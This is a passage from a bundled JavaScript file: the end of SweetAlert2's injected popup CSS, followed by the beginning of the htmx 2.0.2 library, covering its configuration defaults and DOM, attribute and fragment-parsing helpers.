1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm){border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):focus-visible{box-shadow:0 0 0 3px rgba(112,102,224,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny){border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):focus-visible{box-shadow:0 0 0 3px rgba(220,55,65,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel){border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):focus-visible{box-shadow:0 0 0 3px rgba(110,120,129,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-default-outline:focus-visible{box-shadow:0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-styled):focus-visible{outline:none}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em;text-align:center}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em}div:where(.swal2-container) button:where(.swal2-close){z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:none;background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus-visible{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) .swal2-html-container{z-index:1;justify-content:center;margin:0;padding:1em 1.6em .3em;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:#fff}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}div:where(.swal2-icon).swal2-warning{border-color:#facea8;color:#f8bb86}div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}div:where(.swal2-icon).swal2-info{border-color:#9de0f6;color:#3fc3ee}div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}div:where(.swal2-icon).swal2-question{border-color:#c9dae1;color:#87adbd}div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}');
    }
  });

  // node_modules/htmx.org/dist/htmx.esm.js
  var htmx2 = function() {
    "use strict";
    const htmx = {
      // Tsc madness here, assigning the functions directly results in an invalid TypeScript output, but reassigning is fine
      /* Event processing */
      /** @type {typeof onLoadHelper} */
      onLoad: null,
      /** @type {typeof processNode} */
      process: null,
      /** @type {typeof addEventListenerImpl} */
      on: null,
      /** @type {typeof removeEventListenerImpl} */
      off: null,
      /** @type {typeof triggerEvent} */
      trigger: null,
      /** @type {typeof ajaxHelper} */
      ajax: null,
      /* DOM querying helpers */
      /** @type {typeof find} */
      find: null,
      /** @type {typeof findAll} */
      findAll: null,
      /** @type {typeof closest} */
      closest: null,
      /**
       * Returns the input values that would resolve for a given element via the htmx value resolution mechanism
       *
       * @see https://htmx.org/api/#values
       *
       * @param {Element} elt the element to resolve values on
       * @param {HttpVerb} type the request type (e.g. **get** or **post**) non-GET's will include the enclosing form of the element. Defaults to **post**
       * @returns {Object}
       */
      values: function(elt, type) {
        const inputValues = getInputValues(elt, type || "post");
        return inputValues.values;
      },
      /* DOM manipulation helpers */
      /** @type {typeof removeElement} */
      remove: null,
      /** @type {typeof addClassToElement} */
      addClass: null,
      /** @type {typeof removeClassFromElement} */
      removeClass: null,
      /** @type {typeof toggleClassOnElement} */
      toggleClass: null,
      /** @type {typeof takeClassForElement} */
      takeClass: null,
      /** @type {typeof swap} */
      swap: null,
      /* Extension entrypoints */
      /** @type {typeof defineExtension} */
      defineExtension: null,
      /** @type {typeof removeExtension} */
      removeExtension: null,
      /* Debugging */
      /** @type {typeof logAll} */
      logAll: null,
      /** @type {typeof logNone} */
      logNone: null,
      /* Debugging */
      /**
       * The logger htmx uses to log with
       *
       * @see https://htmx.org/api/#logger
       */
      logger: null,
      /**
       * A property holding the configuration htmx uses at runtime.
       *
       * Note that using a [meta tag](https://htmx.org/docs/#config) is the preferred mechanism for setting these properties.
       *
       * @see https://htmx.org/api/#config
       */
      config: {
        /**
         * Whether to use history.
         * @type boolean
         * @default true
         */
        historyEnabled: true,
        /**
         * The number of pages to keep in **localStorage** for history support.
         * @type number
         * @default 10
         */
        historyCacheSize: 10,
        /**
         * @type boolean
         * @default false
         */
        refreshOnHistoryMiss: false,
        /**
         * The default swap style to use if **[hx-swap](https://htmx.org/attributes/hx-swap)** is omitted.
         * @type HtmxSwapStyle
         * @default 'innerHTML'
         */
        defaultSwapStyle: "innerHTML",
        /**
         * The default delay between receiving a response from the server and doing the swap.
         * @type number
         * @default 0
         */
        defaultSwapDelay: 0,
        /**
         * The default delay between completing the content swap and settling attributes.
         * @type number
         * @default 20
         */
        defaultSettleDelay: 20,
        /**
         * If true, htmx will inject a small amount of CSS into the page to make indicators invisible unless the **htmx-indicator** class is present.
         * @type boolean
         * @default true
         */
        includeIndicatorStyles: true,
        /**
         * The class to place on indicators when a request is in flight.
         * @type string
         * @default 'htmx-indicator'
         */
        indicatorClass: "htmx-indicator",
        /**
         * The class to place on triggering elements when a request is in flight.
         * @type string
         * @default 'htmx-request'
         */
        requestClass: "htmx-request",
        /**
         * The class to temporarily place on elements that htmx has added to the DOM.
         * @type string
         * @default 'htmx-added'
         */
        addedClass: "htmx-added",
        /**
         * The class to place on target elements when htmx is in the settling phase.
         * @type string
         * @default 'htmx-settling'
         */
        settlingClass: "htmx-settling",
        /**
         * The class to place on target elements when htmx is in the swapping phase.
         * @type string
         * @default 'htmx-swapping'
         */
        swappingClass: "htmx-swapping",
        /**
         * Allows the use of eval-like functionality in htmx, to enable **hx-vars**, trigger conditions & script tag evaluation. Can be set to **false** for CSP compatibility.
         * @type boolean
         * @default true
         */
        allowEval: true,
        /**
         * If set to false, disables the interpretation of script tags.
         * @type boolean
         * @default true
         */
        allowScriptTags: true,
        /**
         * If set, the nonce will be added to inline scripts.
         * @type string
         * @default ''
         */
        inlineScriptNonce: "",
        /**
         * If set, the nonce will be added to inline styles.
         * @type string
         * @default ''
         */
        inlineStyleNonce: "",
        /**
         * The attributes to settle during the settling phase.
         * @type string[]
         * @default ['class', 'style', 'width', 'height']
         */
        attributesToSettle: ["class", "style", "width", "height"],
        /**
         * Allow cross-site Access-Control requests using credentials such as cookies, authorization headers or TLS client certificates.
         * @type boolean
         * @default false
         */
        withCredentials: false,
        /**
         * @type number
         * @default 0
         */
        timeout: 0,
        /**
         * The default implementation of **getWebSocketReconnectDelay** for reconnecting after unexpected connection loss by the event code **Abnormal Closure**, **Service Restart** or **Try Again Later**.
         * @type {'full-jitter' | ((retryCount:number) => number)}
         * @default "full-jitter"
         */
        wsReconnectDelay: "full-jitter",
        /**
         * The type of binary data being received over the WebSocket connection
         * @type BinaryType
         * @default 'blob'
         */
        wsBinaryType: "blob",
        /**
         * @type string
         * @default '[hx-disable], [data-hx-disable]'
         */
        disableSelector: "[hx-disable], [data-hx-disable]",
        /**
         * @type {'auto' | 'instant' | 'smooth'}
         * @default 'instant'
         */
        scrollBehavior: "instant",
        /**
         * If the focused element should be scrolled into view.
         * @type boolean
         * @default false
         */
        defaultFocusScroll: false,
        /**
         * If set to true htmx will include a cache-busting parameter in GET requests to avoid caching partial responses by the browser
         * @type boolean
         * @default false
         */
        getCacheBusterParam: false,
        /**
         * If set to true, htmx will use the View Transition API when swapping in new content.
         * @type boolean
         * @default false
         */
        globalViewTransitions: false,
        /**
         * htmx will format requests with these methods by encoding their parameters in the URL, not the request body
         * @type {(HttpVerb)[]}
         * @default ['get', 'delete']
         */
        methodsThatUseUrlParams: ["get", "delete"],
        /**
         * If set to true, disables htmx-based requests to non-origin hosts.
         * @type boolean
         * @default false
         */
        selfRequestsOnly: true,
        /**
         * If set to true htmx will not update the title of the document when a title tag is found in new content
         * @type boolean
         * @default false
         */
        ignoreTitle: false,
        /**
         * Whether the target of a boosted element is scrolled into the viewport.
         * @type boolean
         * @default true
         */
        scrollIntoViewOnBoost: true,
        /**
         * The cache to store evaluated trigger specifications into.
         * You may define a simple object to use a never-clearing cache, or implement your own system using a [proxy object](https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/Proxy)
         * @type {Object|null}
         * @default null
         */
        triggerSpecsCache: null,
        /** @type boolean */
        disableInheritance: false,
        /** @type HtmxResponseHandlingConfig[] */
        responseHandling: [
          { code: "204", swap: false },
          { code: "[23]..", swap: true },
          { code: "[45]..", swap: false, error: true }
        ],
        /**
         * Whether to process OOB swaps on elements that are nested within the main response element.
         * @type boolean
         * @default true
         */
        allowNestedOobSwaps: true
      },
      /** @type {typeof parseInterval} */
      parseInterval: null,
      /** @type {typeof internalEval} */
      _: null,
      version: "2.0.2"
    };
    htmx.onLoad = onLoadHelper;
    htmx.process = processNode;
    htmx.on = addEventListenerImpl;
    htmx.off = removeEventListenerImpl;
    htmx.trigger = triggerEvent;
    htmx.ajax = ajaxHelper;
    htmx.find = find;
    htmx.findAll = findAll;
    htmx.closest = closest;
    htmx.remove = removeElement;
    htmx.addClass = addClassToElement;
    htmx.removeClass = removeClassFromElement;
    htmx.toggleClass = toggleClassOnElement;
    htmx.takeClass = takeClassForElement;
    htmx.swap = swap;
    htmx.defineExtension = defineExtension;
    htmx.removeExtension = removeExtension;
    htmx.logAll = logAll;
    htmx.logNone = logNone;
    htmx.parseInterval = parseInterval;
    htmx._ = internalEval;
    const internalAPI = {
      addTriggerHandler,
      bodyContains,
      canAccessLocalStorage,
      findThisElement,
      filterValues,
      swap,
      hasAttribute,
      getAttributeValue,
      getClosestAttributeValue,
      getClosestMatch,
      getExpressionVars,
      getHeaders,
      getInputValues,
      getInternalData,
      getSwapSpecification,
      getTriggerSpecs,
      getTarget,
      makeFragment,
      mergeObjects,
      makeSettleInfo,
      oobSwap,
      querySelectorExt,
      settleImmediately,
      shouldCancel,
      triggerEvent,
      triggerErrorEvent,
      withExtensions
    };
    const VERBS = ["get", "post", "put", "delete", "patch"];
    const VERB_SELECTOR = VERBS.map(function(verb) {
      return "[hx-" + verb + "], [data-hx-" + verb + "]";
    }).join(", ");
    const HEAD_TAG_REGEX = makeTagRegEx("head");
    function makeTagRegEx(tag, global = false) {
      return new RegExp(
        `<${tag}(\\s[^>]*>|>)([\\s\\S]*?)<\\/${tag}>`,
        global ? "gim" : "im"
      );
    }
    function parseInterval(str2) {
      if (str2 == void 0) {
        return void 0;
      }
      let interval = NaN;
      if (str2.slice(-2) == "ms") {
        interval = parseFloat(str2.slice(0, -2));
      } else if (str2.slice(-1) == "s") {
        interval = parseFloat(str2.slice(0, -1)) * 1e3;
      } else if (str2.slice(-1) == "m") {
        interval = parseFloat(str2.slice(0, -1)) * 1e3 * 60;
      } else {
        interval = parseFloat(str2);
      }
      return isNaN(interval) ? void 0 : interval;
    }
    function getRawAttribute(elt, name) {
      return elt instanceof Element && elt.getAttribute(name);
    }
    function hasAttribute(elt, qualifiedName) {
      return !!elt.hasAttribute && (elt.hasAttribute(qualifiedName) || elt.hasAttribute("data-" + qualifiedName));
    }
    function getAttributeValue(elt, qualifiedName) {
      return getRawAttribute(elt, qualifiedName) || getRawAttribute(elt, "data-" + qualifiedName);
    }
    function parentElt(elt) {
      const parent = elt.parentElement;
      if (!parent && elt.parentNode instanceof ShadowRoot) return elt.parentNode;
      return parent;
    }
    function getDocument() {
      return document;
    }
    function getRootNode(elt, global) {
      return elt.getRootNode ? elt.getRootNode({ composed: global }) : getDocument();
    }
    function getClosestMatch(elt, condition) {
      while (elt && !condition(elt)) {
        elt = parentElt(elt);
      }
      return elt || null;
    }
    function getAttributeValueWithDisinheritance(initialElement, ancestor, attributeName) {
      const attributeValue = getAttributeValue(ancestor, attributeName);
      const disinherit = getAttributeValue(ancestor, "hx-disinherit");
      var inherit = getAttributeValue(ancestor, "hx-inherit");
      if (initialElement !== ancestor) {
        if (htmx.config.disableInheritance) {
          if (inherit && (inherit === "*" || inherit.split(" ").indexOf(attributeName) >= 0)) {
            return attributeValue;
          } else {
            return null;
          }
        }
        if (disinherit && (disinherit === "*" || disinherit.split(" ").indexOf(attributeName) >= 0)) {
          return "unset";
        }
      }
      return attributeValue;
    }
    function getClosestAttributeValue(elt, attributeName) {
      let closestAttr = null;
      getClosestMatch(elt, function(e) {
        return !!(closestAttr = getAttributeValueWithDisinheritance(elt, asElement(e), attributeName));
      });
      if (closestAttr !== "unset") {
        return closestAttr;
      }
    }
    function matches(elt, selector) {
      const matchesFunction = elt instanceof Element && (elt.matches || elt.matchesSelector || elt.msMatchesSelector || elt.mozMatchesSelector || elt.webkitMatchesSelector || elt.oMatchesSelector);
      return !!matchesFunction && matchesFunction.call(elt, selector);
    }
    function getStartTag(str2) {
      const tagMatcher = /<([a-z][^\/\0>\x20\t\r\n\f]*)/i;
      const match = tagMatcher.exec(str2);
      if (match) {
        return match[1].toLowerCase();
      } else {
        return "";
      }
    }
    function parseHTML(resp) {
      const parser = new DOMParser();
      return parser.parseFromString(resp, "text/html");
    }
    function takeChildrenFor(fragment, elt) {
      while (elt.childNodes.length > 0) {
        fragment.append(elt.childNodes[0]);
      }
    }
    function duplicateScript(script) {
      const newScript = getDocument().createElement("script");
      forEach(script.attributes, function(attr) {
        newScript.setAttribute(attr.name, attr.value);
      });
      newScript.textContent = script.textContent;
      newScript.async = false;
      if (htmx.config.inlineScriptNonce) {
        newScript.nonce = htmx.config.inlineScriptNonce;
      }
      return newScript;
    }
    function isJavaScriptScriptNode(script) {
      return script.matches("script") && (script.type === "text/javascript" || script.type === "module" || script.type === "");
    }
    function normalizeScriptTags(fragment) {
      Array.from(fragment.querySelectorAll("script")).forEach(
        /** @param {HTMLScriptElement} script */
        (script) => {
          if (isJavaScriptScriptNode(script)) {
            const newScript = duplicateScript(script);
            const parent = script.parentNode;
            try {
              parent.insertBefore(newScript, script);
            } catch (e) {
              logError(e);
            } finally {
              script.remove();
            }
          }
        }
      );
    }
    function makeFragment(response) {
      const responseWithNoHead = response.replace(HEAD_TAG_REGEX, "");
      const startTag = getStartTag(responseWithNoHead);
      let fragment;
      if (startTag === "html") {
        fragment = /** @type DocumentFragmentWithTitle */
        new DocumentFragment();
        const doc = parseHTML(response);
        takeChildrenFor(fragment, doc.body);
        fragment.title = doc.title;
      } else if (startTag === "body") {
        fragment = /** @type DocumentFragmentWithTitle */
        new DocumentFragment();
        const doc = parseHTML(responseWithNoHead);
        takeChildrenFor(fragment, doc.body);
        fragment.title = doc.title;
      } else {
        const doc = parseHTML('<body><template class="internal-htmx-wrapper">' + responseWithNoHead + "</template></body>");
        fragment = /** @type DocumentFragmentWithTitle */
        doc.querySelector("template").content;
        fragment.title = doc.title;
        var titleElement = fragment.querySelector("title");
        if (titleElement && titleElement.parentNode === fragment) {
          titleElement.remove();
          fragment.title = titleElement.innerText;
        }
      }
      if (fragment) {
        if (htmx.config.allowScriptTags) {
          normalizeScriptTags(fragment);
        } else {
          fragment.querySelectorAll("script").forEach((script) => script.remove());
        }
      }
      return fragment;
    }
    function maybeCall(func) {
      if (func) {
        func();
      }
    }
    function isType(o2, type) {
      return Object.prototype.toString.call(o2) === "[object " + type + "]";
    }
    function isFunction(o2) {
      return typeof o2 === "function";
    }
    function isRawObject(o2) {
      return isType(o2, "Object");
    }
    function getInternalData(elt) {
      const dataProp = "htmx-internal-data";
